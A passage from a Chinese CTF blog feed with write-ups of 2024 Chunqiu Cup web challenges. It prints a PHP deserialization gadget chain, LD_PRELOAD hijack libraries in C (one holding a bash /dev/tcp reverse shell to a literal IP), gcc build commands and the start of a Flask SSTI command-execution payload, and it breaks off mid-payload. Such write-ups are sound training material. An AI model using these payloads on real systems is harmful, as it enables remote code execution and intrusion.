punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="NewerFileDetector（Unsolved）"><a href="#NewerFileDetector（Unsolved）" class="headerlink" title="NewerFileDetector（Unsolved）"></a>NewerFileDetector（Unsolved）</h2><blockquote><p>xss</p></blockquote><hr><h2 id="SendMessage（Unsolved）"><a href="#SendMessage（Unsolved）" class="headerlink" title="SendMessage（Unsolved）"></a>SendMessage（Unsolved）</h2><p>php在处理共享内存跨进程通讯时，如果内存里面的内容可控，会直接触发反序列化操作</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;web和pwn最分不开的一集&lt;/p&gt;
&lt;p&gt;官方wp：&lt;a href=&quot;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&quot;&gt;https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;草，一个最新最热cve分别出了一个web题和一个pwn题&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="CVE" scheme="http://c1oudfl0w0.github.io/blog/tags/CVE/"/>
    
    <category term="RCE" scheme="http://c1oudfl0w0.github.io/blog/tags/RCE/"/>
    
    <category term="PHP" scheme="http://c1oudfl0w0.github.io/blog/tags/PHP/"/>
    
    <category term="ctfshow" scheme="http://c1oudfl0w0.github.io/blog/tags/ctfshow/"/>
    
    <category term="ThinkPHP" scheme="http://c1oudfl0w0.github.io/blog/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>2024春秋杯网络安全联赛夏季赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/</id>
    <published>2024-07-05T15:22:54.000Z</published>
    <updated>2024-07-16T16:45:09.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>个人名称：雲流</p><p>个人排名：68</p><p>签到题都做不来有点难绷</p><p>参考：</p><p>第一名的wp：<a href="https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&mid=2247486883&idx=1&sn=4a99836ee029141df32979be33b0a663">https://mp.weixin.qq.com/s?__biz=MzUzNDMyNjI3Mg==&amp;mid=2247486883&amp;idx=1&amp;sn=4a99836ee029141df32979be33b0a663</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h2><blockquote><p>反序列化 + ld_preload劫持</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'%'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\('</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\)'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$pattern</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"No injecting!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span>=<span class="token interpolation"><span class="token variable">$value</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat hints.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"YesYesYes"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You are stupid, what exactly is your identity?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$arg1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker"</span><span class="token operator">==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hacker is bad guy!!!"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$function_name</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.[^.]*$/'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/tmp/"</span><span class="token punctuation">;</span>            <span class="token variable">$destination</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$destination</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string double-quoted-string">"文件成功移动到$&#123;destination&#125;"</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'文件移动失败。'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"非法文件名。"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Harder'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼ld_preload</p><p>稍微审计一下，给了上传文件的地方，那么我们要做的就是劫持<code>cat</code>命令</p><p>上传文件的链子：<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FUN::__get -&gt; FILE::__call</code></p><p>准备一下so文件</p><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240705235511829.png" alt="image-20240705235511829"></p><p>劫持strncmp即可</p><p>hook_strncmp.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">void</span> <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'bash -i >&amp; /dev/tcp/115.236.153.177/30908 &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">strncmp</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>__s2<span class="token punctuation">,</span> <span class="token class-name">size_t</span> __n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 这里函数的定义可以根据报错信息进行确定</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">payload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译so文件并用base64输出</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hook_strncmp.c <span class="token parameter variable">-o</span> hook_strncmp.so base64 hook_strncmp.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"1.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FUN</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">fun</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706000251607.png" alt="image-20240706000251607"></p><p>得到文件路径：<code>/tmp/29f91f211e3f3f46e167f664c28f6136.so</code></p><p>接下来触发<code>ENV::__toString</code>，用字符串与对象的弱比较触发</p><p>链子：<code>ENV::__wakeup -&gt; DIFF::__isset -&gt; FILE::__get -&gt; ENV::__toString</code></p><p>（so文件不一样是因为我个fw做超时了x）</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ENV</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string double-quoted-string">"LD_PRELOAD"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token operator">=</span><span class="token string double-quoted-string">"/tmp/1ce494339fd8f830fd8318acb4782917.so"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$math</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DIFF</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$back</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FILE</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$enviroment</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FUN</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fun</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DIFF</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FILE</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">math</span><span class="token operator">-></span><span class="token property">callback</span><span class="token operator">-></span><span class="token property">enviroment</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ENV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而没弹出shell</p><p>可以用下面的payload看一下LD_PRELOAD当前的值：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"ENV"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"value"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"math"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"stdClass"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现LD_PRELOAD是空的，看来是没写成</p><p>hint.txt的内容：<code>RCE!!!!!!!?????? Try every possible means!!!!! Remote Code Execution!!!! THIS_IS_FAKE_CAT!!!!</code></p><p>说明这里不能直接劫持cat命令</p><p>那就考虑劫持系统新进程来绕过，测试发现好像不出网，那么直接写文件带外即可</p><p>hack.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">void</span> <span class="token function">preload</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"ls / > /var/www/html/1.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">-shared</span> <span class="token parameter variable">-fPIC</span> hack.c <span class="token parameter variable">-o</span> evil.so <span class="token parameter variable">-ldl</span>base64 evil.so <span class="token parameter variable">-w</span> <span class="token number">0</span> <span class="token operator">></span><span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/05/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%A4%8F%E5%AD%A3%E8%B5%9B/image-20240706012644782.png" alt="image-20240706012644782"></p><p>得到flag的位置：&#x2F;flag_9e6244c7d4c5bd9cf815</p><p>故技重施即可得到flag</p><hr><h2 id="brother"><a href="#brother" class="headerlink" title="brother"></a>brother</h2><blockquote><p>flask ssti + udf提权</p></blockquote><p>进去，直接给了个参数<code>name</code>，看了下框架是python的flask，那直接猜ssti</p><p>测了下发现没过滤，直接传payload弹shell</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token 